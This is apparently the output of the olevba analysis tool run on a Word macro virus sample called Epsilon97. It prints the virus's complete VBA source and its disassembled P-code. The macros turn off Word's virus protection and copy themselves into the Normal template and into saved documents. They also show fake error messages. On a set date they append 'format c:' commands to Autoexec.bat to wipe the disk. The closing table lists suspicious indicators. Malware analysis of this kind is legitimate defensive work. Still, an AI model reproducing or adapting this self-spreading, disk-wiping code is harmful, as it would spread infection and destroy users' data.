olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Epsilon
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Epsilon - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Epsilon97.bas 
in file: Virus.MSWord.Epsilon - OLE stream: 'Macros/VBA/Epsilon97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
CommandBars("Files").Controls(1).Enabled = False
CommandBars("Files").Controls(2).Enabled = False
CommandBars("Files").Controls(4).Enabled = False
CommandBars("Files").Controls(6).Enabled = False
CommandBars("Files").Controls(7).Enabled = False
CommandBars("Files").Controls(8).Enabled = False
CommandBars("Files").Controls(9).Enabled = False
CommandBars("Tools").Controls(1).Caption = "Virus Epsilon97 par ZeMacroKiller98"
CommandBars("Tools").Controls(2).Caption = "HAHAHAHAHA!!!!!!"
CommandBars("Tools").Controls(3).Caption = "Vive les Virus de Macro..."
If D$ = "18/04" Then
    MsgBox "C'est mon anniversaire, aujourd'hui", vbInformation, "Epsilon97"
        Open "C:\Autoexec.bat" For Append As #1
            Print #1, "echo off"
            Print #1, "rem version française"
            Print #1, "echo o|format c: /u"
            Print #1, "rem version anglaise"
            Print #1, "echo y|format c: /u"
            Print #1, "echo Joyeux Anniversaire!!!!!!"
        Close #1
MsgBox "Au revoir....", vbInformation, "Epsilon97"
Tasks.ExitWindows
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](0, 0) = "Epsilon97" Then
        Epsilon97Installed = -1
    End If
Next i
If Not Epsilon97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Epsilon97", Object:=wdOrganizerObjectProjectItems
MsgBox "Attention, je vous ai contaminé..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbInformation, "Epsilon97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Epsilon97", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
Dim N$
Randomize
    MsgBox "System Error!!!", vbCritical, "Microsoft Word"
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 3, 5, 7, 9
        CommandBars("Tools").Controls(14).Caption = "Epsilon97, c'est COOL!!!!"
    Case 2, 4, 6, 8, 10
        CommandBars("Tools").Controls(14).Caption = "Modèles et compléments..."
End Select
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
Dim N$
Randomize
MsgBox "User32 Error!!!!", vbCritical, "Microsoft Word"
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 2, 3, 4, 5
        CommandBars("Tools").Controls(13).Caption = "ZeMacroKiller98 va vous étonner..."
    Case 6, 7, 8, 9, 10
        CommandBars("Tools").Controls(13).Caption = "Macros"
End Select
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Epsilon
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1336 bytes
' Macros/VBA/Epsilon97 - 12318 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAE 
' Line #5:
' 	Dim 
' 	VarDefn MyDate
' Line #6:
' 	Ld Date 
' 	St MyDate 
' Line #7:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #8:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (False)
' 	LitDI2 0x0007 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (False)
' 	LitDI2 0x0008 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #14:
' 	LitVarSpecial (False)
' 	LitDI2 0x0009 
' 	LitStr 0x0005 "Files"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #15:
' 	LitStr 0x0023 "Virus Epsilon97 par ZeMacroKiller98"
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #16:
' 	LitStr 0x0010 "HAHAHAHAHA!!!!!!"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #17:
' 	LitStr 0x001A "Vive les Virus de Macro..."
' 	LitDI2 0x0003 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #18:
' 	Ld D$ 
' 	LitStr 0x0005 "18/04"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitStr 0x0023 "C'est mon anniversaire, aujourd'hui"
' 	Ld vbInformation 
' 	LitStr 0x0009 "Epsilon97"
' 	ArgsCall MsgBox 0x0003 
' Line #20:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "echo off"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "rem version française"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo o|format c: /u"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "rem version anglaise"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "echo y|format c: /u"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "echo Joyeux Anniversaire!!!!!!"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #28:
' 	LitStr 0x000D "Au revoir...."
' 	Ld vbInformation 
' 	LitStr 0x0009 "Epsilon97"
' 	ArgsCall MsgBox 0x0003 
' Line #29:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label ErrorAE 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub AutoOpen())
' Line #34:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #35:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #37:
' 	OnError ErrorAO 
' Line #38:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #40:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "Epsilon97"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Epsilon97Installed 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Ld Epsilon97Installed 
' 	Not 
' 	IfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Epsilon97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	LitStr 0x0022 "Attention, je vous ai contaminé..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000F "HAHAHAHAHA!!!!!"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0009 "Epsilon97"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Label ErrorAO 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FileSaveAs())
' Line #51:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #52:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #54:
' 	OnError ErrorFSA 
' Line #55:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #57:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Epsilon97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #60:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	Label ErrorFSA 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub FileTemplates())
' Line #64:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #65:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #67:
' 	OnError ErrorFT 
' Line #68:
' 	Dim 
' 	VarDefn N
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	LitStr 0x000F "System Error!!!"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #72:
' 	Ld N$ 
' 	SelectCase 
' Line #73:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #74:
' 	LitStr 0x0019 "Epsilon97, c'est COOL!!!!"
' 	LitDI2 0x000E 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #75:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #76:
' 	LitStr 0x0019 "Modèles et compléments..."
' 	LitDI2 0x000E 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #77:
' 	EndSelect 
' Line #78:
' 	Label ErrorFT 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub ToolsMacro())
' Line #81:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #82:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #84:
' 	OnError ErrorTM 
' Line #85:
' 	Dim 
' 	VarDefn N
' Line #86:
' 	ArgsCall Read 0x0000 
' Line #87:
' 	LitStr 0x0010 "User32 Error!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #88:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #89:
' 	Ld N$ 
' 	SelectCase 
' Line #90:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #91:
' 	LitStr 0x0022 "ZeMacroKiller98 va vous étonner..."
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #92:
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #93:
' 	LitStr 0x0006 "Macros"
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #94:
' 	EndSelect 
' Line #95:
' 	Label ErrorTM 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub ViewVBCode())
' Line #98:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #99:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #100:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #101:
' 	OnError ErrorVVBC 
' Line #102:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #103:
' 	Label ErrorVVBC 
' Line #104:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

